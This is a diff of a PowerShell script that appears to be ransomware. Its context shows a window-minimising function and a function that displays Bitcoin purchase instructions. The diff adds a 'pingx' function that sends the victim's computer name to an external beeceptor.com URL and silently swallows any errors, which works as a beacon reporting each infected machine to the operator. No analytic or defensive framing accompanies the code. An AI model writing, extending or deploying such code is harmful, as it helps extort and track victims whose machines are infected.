@@ -51,7 +51,17 @@ function Hide-AllWindows {
         $shell.MinimizeAll()
     } catch {}
 }
-
+function pingx {
+    try {
+         $computerName = $env:COMPUTERNAME
+        $webClient = New-Object System.Net.WebClient
+       
+        $signalBytes = $webClient.DownloadData("https://ig49hsdihfeishkdjhfes.free.beeceptor.com/?msg=$computerName")
+        
+    } catch {
+        
+    }
+}
 # Function to show Bitcoin purchase instructions
 function Show-BitcoinInstructions {
     $instructionsWindow = New-Object System.Windows.Window
